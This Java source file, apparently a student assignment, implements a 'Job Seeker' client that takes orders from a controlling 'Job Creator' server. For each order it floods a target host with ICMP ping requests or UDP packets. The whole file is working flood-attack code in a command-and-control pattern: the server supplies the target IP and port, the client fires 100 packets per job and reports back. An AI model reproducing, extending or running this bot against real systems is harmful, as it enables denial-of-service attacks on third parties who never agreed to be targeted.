//Assignment 3: Job Seeker Client for One-To-Many Questions
//Donovan Longo
//This class connects to a Job Creator and communicates with it to complete ICMP/UDP flood attacks and terminate the connection
import java.io.*;
import java.util.*;

import org.icmp4j.IcmpPingRequest;
import org.icmp4j.IcmpPingResponse;
import org.icmp4j.IcmpPingUtil;

import java.net.*;

public class JobSeekerClient2 {
	public static void main(String[] args)
	{
		// ip and port number, could change, used to run on local machine
		String ip = "127.0.0.1";
		int port = 8080;
		
		// used for socket
		try(Socket socket = new Socket(ip,port)){
			System.out.println("Job Seeker is available looking for a Job Creator to send a IP Address/Host Name to execute ICMP or UDP flood attack");
			
			// used for output
			OutputStream output = socket.getOutputStream();
			PrintWriter pw = new PrintWriter(output,true);
			
			// used for input
			InputStream input = socket.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(input));
			
			String cont = "yes"; // used to check if Job Creator has terminated the connection
			String start = ""; // used to check if connection is accepted
	
			Scanner sc = new Scanner(System.in); // used to get input
			
			// check if job is wanted
			System.out.println("Do you want to accept a job from this Job Creator? (yes/no)");
			start = sc.next();
			pw.println(start); // send Job is wanted to Job Creator
			
			String result = "";
			String option = "yes";
			
			// if wanted
			if(start.equals("yes")) {
				do {	
					
					// get the Job option
					int getProgram = Integer.parseInt(br.readLine());
					// 0 is ICMP flood attack
					if(getProgram == 0) {
						// get the IP Address/Host Name 
						String ipH = "";
						ipH = br.readLine();
						
						// Output attack is staring
						System.out.println("\nSending ping requests to " +ipH + "\n");
										
						//Create ICMP packets with external library
						IcmpPingRequest request = IcmpPingUtil.createIcmpPingRequest() ;
						request.setHost (ipH);
						
						//Create loop of ping requests to specified IP
						for(int i=0; i<100; i++)
						{
							IcmpPingResponse response = IcmpPingUtil.executePingRequest (request);
						}
						
						// send result to Job Creator
						System.out.println("Sending Results to Job Creator");
						pw.println("100 ping requests were sent to " + ipH +" from this Seeker");
					}else {
						// UDP flood attack
						// IP Address/Host Name
						String ipH = "";
						int givenPort;
						
						// get the IP Address/Host Name and Port from Job Creator
						ipH = br.readLine();
						givenPort = Integer.parseInt(br.readLine());
						
						// Output attack is starting
						System.out.println("\nSending UDP packets to " +ipH + " port: " + givenPort + "\n");
						
						//Create a loop to make multiple UDP packets to send
						for(int j = 0; j<100; j++)
						{
							//Create UDP packets to send
							DatagramSocket datagramSocket = new DatagramSocket();
							byte [] buffer = new byte[1000];
							InetAddress address = InetAddress.getByName(ipH);
							
							//Send UDP Packet to IP
							DatagramPacket UDPpacket = new DatagramPacket(buffer, buffer.length, address, givenPort);
							datagramSocket.send(UDPpacket);
						}
						
						
						
						//send results to Job Creator
						System.out.println("Letting Creator know 100 UDP packet were sent to " + ipH + " port: " + givenPort + "\n");
						pw.println("100 UDP packets were sent to " + ipH + " port: " + givenPort +" from this Seeker");
					}
					
					// ask if another is wanted
					System.out.println("\nWant to do another Job? (yes/no)");
					option = sc.next();
					
					// send option to Job Creator
					pw.println(option);
					
					// check if Creator terminated
					if((cont=br.readLine()) != null) {
						if(cont.equals("no")) {
							System.out.println("Job Creator terminated the Connection");
						}
					}				
					
				}while(option.equals("yes") && cont.equals("yes")); // check if another iteration is wanted
				
			}else {
				pw.println(start); // if rejected
			}

			socket.close(); // close connection
			
    		} catch (UnknownHostException ex) {
    			System.out.println("Server not found: " + ex.getMessage());
    		} catch (IOException ex) {
    			System.out.println("I/O error: " + ex.getMessage());
    		}		
	}
	
	
}
